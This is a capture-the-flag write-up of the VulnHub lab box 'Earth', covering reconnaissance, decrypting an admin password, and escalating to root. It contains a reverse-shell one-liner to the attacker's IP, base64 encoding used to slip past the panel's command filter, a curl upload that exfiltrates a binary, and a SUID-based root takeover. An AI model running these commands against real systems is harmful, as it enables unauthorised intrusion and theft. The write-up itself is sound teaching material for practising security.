+++
title = "The Planets: Earth (VulnHub)"
date = "2026-11-18T11:18:20"
description = "A random write up of the vulnhub box Earth, the second box in the series of boxes called the planets."
+++

Earth is a box in side a series of box, made to be a medium level box which requires decryption messages, reverse engineering, and more. :3
I would do the one you're supposed to do before this called Mercury but that is stuck as being virtual box only and I don't want to deal with virtual box's problems.

Any ways without further ado lets get into the box.

# 0. Discovery

So first thing to do is figure out what the IP address is for this box. Personally i'm going to do this with `nmap -sn` but you can use any IP scanner.

```
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-18 08:43 -0500
Nmap scan report for 172.16.224.1
Host is up (0.00035s latency).
Nmap scan report for 172.16.224.130
Host is up (0.00027s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.11 seconds
```

We can see that the
Box IP: .130
Mine: .1

So let's scan the IP address, which personally I used `nmap -A` for this which is overkill but it's useful to extract some information. Basically -A is the kitchen sink of NMap, which means it runs -sV to detect the version, -O to detect the operating system, -sC runs the default nmap scripts, and --traceroute to as the name says run a traceroute.

```
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-18 08:44 -0500
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.224.130
Host is up (2.6s latency).
Not shown: 904 filtered tcp ports (no-response), 93 filtered tcp ports (host-unreach)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the HTTP Server on Fedora
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.60 seconds
```

SSH is open so that is one attack vector.
But it also seems like we are required to run with https so we got to modify our hosts file with the domains. Which I do this with a custom script but you can do it with modifying /etc/hosts if on a Unix based system. ([Hosts Script](/write-up-sources/ThePlanetsEarth/scripts/hosts.py))

```sh
sudo python3 hosts.py -a -i 172.16.224.130 -d "terratest.earth.local,earth.local" -c "Earth CTF Domains"
```

# 1. Web Exploring

Now lets dump the website to find anything interesting. Which other than seeing some encrypted data on the website doesn't seem interesting.
Though on terratest there is no data on it, but there is a robots.txt

```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

That makes me want to check out testingnotes which can either be .txt or .md.

It was a .txt :3
The notes document says

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

So this gives us a few hints, one of the encryption keys is at testdata.txt, terra is a username for a possible admin panel, and the encryption is XOR.

Now lets head off to the website just to see how it looks
![Main Page](/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_090523.png)

So a pretty basic website.

After pulling down testdata.txt we got

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

So let's pop it into cyberchef and see what we get
![Cyber Chef Decoded](/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_091131.png)

We see we get the data

```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

which just repeats

```
earthclimatechangebad4humans
```

Well now that we are at a dead end lets through gobuster at it. Basically gobuster will send GET requests to different URLs and shows what stuff came back. Also, -b filters out any status code we supply so we don't get spammed with 403 false positives

```sh
gobuster dir --url https://earth.local --wordlist "/mnt/SOLONGGAYBOWSER/Lists/SecLists/Discovery/Web-Content/combined_words.txt" -b
```

which we get back

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://earth.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /mnt/SOLONGGAYBOWSER/Lists/SecLists/Discovery/Web-Content/combined_words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 301) [Size: 0] [--> /admin/]
.                    (Status: 200) [Size: 2595]
Progress: 128372 / 128372 (100.00%)
===============================================================
Finished
===============================================================
```

I also ran it on terratest.earth.local to see if I get anything special, but didn't get anything I didn't know before.

# 2. Admin Page

So time to go to earth.local/admin
![earth.local admin login](/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_094707.png)

Which brought me to a page telling me to login, then I got reminded that the note said the username is terra. I'm going to guess the phrase that got repeated earlier in the decrypted data is the password, so lets see.

THE LOGIN WAS CORRECT :3
AND WE HAVE SHELL ACCESS

![earth.local/admin page](/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_094914.png)

so let's trying to get a reverse shell loaded, which I get the shells from [revshells.com](https://revshells.com) :3

![blocked](/write-up-sources/ThePlanetsEarth/imgs/Screenshot_20261118_095133.png)
and I got blocked :(

So let's encode this in Base64

In Unix you can encode and decode Base64 through the `base64` command.
So we're going to encode it with

```sh
echo "sh -i >& /dev/tcp/172.16.224.1/1234 0>&1" | base64
```

Which the command basically just pipes the command into `base64` sense it only works with files and pipes.

So now we got the encoded command
`c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjIyNC4xLzEyMzQgMD4mMQo=`

So now we run the command with

```sh
echo "c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjIyNC4xLzEyMzQgMD4mMQo=" | base64 -d | sh
```

Which pipes the data into `base64` to decode it then into `sh` to run the command.

and now we got remote access :3

```
Listening on 0.0.0.0 1234
Connection received on 172.16.224.130 50220
sh: cannot set terminal process group (938): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$ 
```

# 3. Shell Exploitation

So first things first, we setup interactive mode through the command

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

and now it's time to look through the system
if we run `whoami` we see

```sh
sh-5.1$ whoami
apache
```

we are the apache user so lets see if we an elevate to a normal user.

Before we do that I want to try to find the key.
Which after looking in /var/earth_web/ we now got the first key :3

```sh
sh-5.1$ cat /var/earth_web/user_flag.txt
cat /var/earth_web/user_flag.txt
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

Now lets see if we can access another user.
After looking in the home folder we find a user called earth. :3
Downside we don't have access to the earth user :(
So we are just going to have to get to root from that user so lets find a SUID applicaion.

```sh
find / -perm -4000 -type f 2>/dev/null
```

For those who don't know SUID will run the executable file that has the byte 4 at the start of the permission as the user's id that owns the file.

and the find command came back with

```
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
```

All of those except reset_root are default Unix apps so no use in going for them in this case. Unless you want to find a vulnerability in the default Unix apps, which would take a lot longer than a basic custom app. Let's see if we can get the data of the file.

After catting the file we can see it's a non stripped binary meaning we need to reverse engineer it. While I would show the output of the cat data, it was just mainly binary data so there isn't any use showing it.

So what we will do is load up an upload server with

```sh
python3 -m uploadserver 
```

and try to upload and send the executable to the host.
After uploading the file with

```sh
curl -X POST http://172.16.224.1:8000/upload -F 'files=@/usr/bin/reset_root'
```

# 4. Reverse Engineering

We now have it on our system.
So let's pop it into Ghidra and see what we get.

Which we see 2 main things, a function called main and another called magic_cipher.

So lets look at magic_cipher first sense it's used a lot in main

```c
void magic_cipher(long param_1,long param_2,long param_3,int param_4,int param_5)

{
  undefined4 local_c;
  
  for (local_c = 0; local_c < param_4; local_c = local_c + 1) {
    *(byte *)(param_3 + local_c) =
         *(byte *)(param_2 + local_c % (param_5 + -1)) ^ *(byte *)(param_1 + local_c);
  }
  return;
}
```

Which after look at it for a bit it looks like an XOR cipher with param_3 being an output buffer, param_1 being input, and param_2 being a key.

So with everything renamed we have

```c

void magic_cipher(long input,long key,long outputBuffer,int forLoopCount,int length)

{
  undefined4 i;
  
  for (i = 0; i < forLoopCount; i = i + 1) {
    *(byte *)(outputBuffer + i) = *(byte *)(key + i % (length + -1)) ^ *(byte *)(input + i);
  }
  return;
}


```

So with that in mind lets tackle the behemoth that is main.

```c

undefined8 main(void)

{
  int iVar1;
  undefined8 local_10c5;
  undefined4 local_10bd;
  undefined1 local_10b9;
  undefined8 local_10b8;
  undefined8 local_10b0;
  undefined1 local_10a8;
  undefined8 local_1098;
  undefined8 local_1090;
  undefined1 local_1088;
  char local_1078 [13];
  undefined1 local_106b;
  undefined1 local_1067;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined1 local_58 [17];
  undefined1 local_47;
  undefined8 local_38;
  undefined8 local_30;
  undefined1 local_28;
  undefined8 local_18;
  undefined4 local_10;
  int local_c;
  
  local_18 = 0x65756c62656c6170;
  local_10 = 0x746f64;
  local_38 = 0x810190e07090904;
  local_30 = 0x555c5d041c161d05;
  local_28 = 0x5e;
  local_78 = 0x69746e6564657263;
  local_70 = 0x746f6f7220736c61;
  local_68 = 0x747261456568743a;
  local_60 = 0x74616c66736968;
  local_c = 0;
  local_1098 = 0xd064314000c5b;
  local_1090 = 0x27077310b2a194e;
  local_1088 = 0x75;
  local_10b8 = 0xd064314000c5b;
  local_10b0 = 0x620067075b15284e;
  local_10a8 = 7;
  local_10c5 = 0x20061e4312081c5b;
  local_10bd = 0x1b072551;
  local_10b9 = 0;
  magic_cipher(&local_38,&local_18,local_58,0x11,0xc);
  local_47 = 0;
  puts("CHECKING IF RESET TRIGGERS PRESENT...");
  magic_cipher(&local_1098,local_58,local_1078,0x11,0x12);
  local_1067 = 0;
  iVar1 = access(local_1078,0);
  if (iVar1 == 0) {
    local_c = local_c + 1;
  }
  magic_cipher(&local_10b8,local_58,local_1078,0x11,0x12);
  local_1067 = 0;
  iVar1 = access(local_1078,0);
  if (iVar1 == 0) {
    local_c = local_c + 1;
  }
  magic_cipher(&local_10c5,local_58,local_1078,0xd,0x12);
  local_106b = 0;
  iVar1 = access(local_1078,0);
  if (iVar1 == 0) {
    local_c = local_c + 1;
  }
  if (local_c == 3) {
    puts("RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth");
    setuid(0);
    system("/usr/bin/echo \'root:Earth\' | /usr/sbin/chpasswd");
  }
  else {
    puts("RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.");
  }
  return 0;
}


```

So lets try to deconstruct this. So we know that the iVar1 is an int that acts like a bool of some type. Looking at the Unix C API we can see that access is to see if the application can access the file ([Linux Manual access](https://www.man7.org/linux/man-pages/man2/access.2.html))
So we can rename iVar1 to doesExist.
Based on what we found out about magic cipher it looks like local_1078 is the output decrypted path for the program to check so we can just rename that to decryptedPath.
We can also rename local_58 to pathDecryptionKey based on earlier discoveries. So lets change up the hex data to actual numbers so we can understand it a bit more.
So after some looking we see that 0x11 equals to the number 17. 0xd also equals to 13 so we can change that one over.

Now that we know those things let's see what the first decryption key is, eulbelap which in Unix everything is reversed so when we reverse it, it translates to paleblue.

Which after some decoding we got the main key :3
`thebluemarble1972`

# 5. Elevating to Root

so the paths are

- `/dev/shm/kHgTFI5G`
- `/dev/shm/Zw7bV9U5`
- `/tmp/kcM0Wewe`

so lets see if it works

```sh
sh-5.1$ echo "0" > /dev/shm/kHgTFI5G
echo "0" > /dev/shm/kHgTFI5G
sh-5.1$ echo "0" > /dev/shm/Zw7bV9U5
echo "0" > /dev/shm/Zw7bV9U5
sh-5.1$ echo "0" > /tmp/kcM0Wewe         
echo "0" > /tmp/kcM0Wewe
sh-5.1$ reset_root
reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```

IT FREAKING WORKING :3

```sh
sh-5.1$ su 
su
Password: Earth

[root@earth /]# 
```

WE ARE FINALLY ROOT :3

AND NOW WE GOT THE FINALLY KEY

```sh
[root@earth /]# cat /root/root_flag.txt
cat /root/root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

YESSSSSSSSSS :3

# Final Notes

This was a pretty fun box to run through. To be honest the first time running through this box I thought it was broken forgetting about scanning for https. All around this is a fun box to mess with when trying to learn about hacking :3. I don't really recommend this to complete beginners sense you need some knowledge on Unix, reverse engineering, and encryption/encoding methods.

All around this was a fun box to mess with. I'll prob mess with the Venus box next to see if I can break into that sense the dude who made these boxes said it's harder than this and the one before this in the series.

# Prevention

- First don't leave a test server connected to your server's IP address or domain. If you do don't leave testing notes that include a decryption key. Basic stuff like that left the system vulnerable from the start.
- Don't put the password to the admin panel on the website as a message even if it's encrypted.
- Don't leave a random admin panel to be able to be accessed on production servers.
- Don't have an executable file that resets the root, especially if it is something that anyone that has access to the shell can do.

While this is a fictional and fun scenario to mess with. In a real scenario the hacker wouldn't be looking for random flags left on the system, they would be looking for login data, user data, and more ways to get further into the network. Leaving simple things like that open on the internet will cause many problems.

Any ways,

happy hacking :3
![cat :3](/imgs/cats/oia-uia.gif)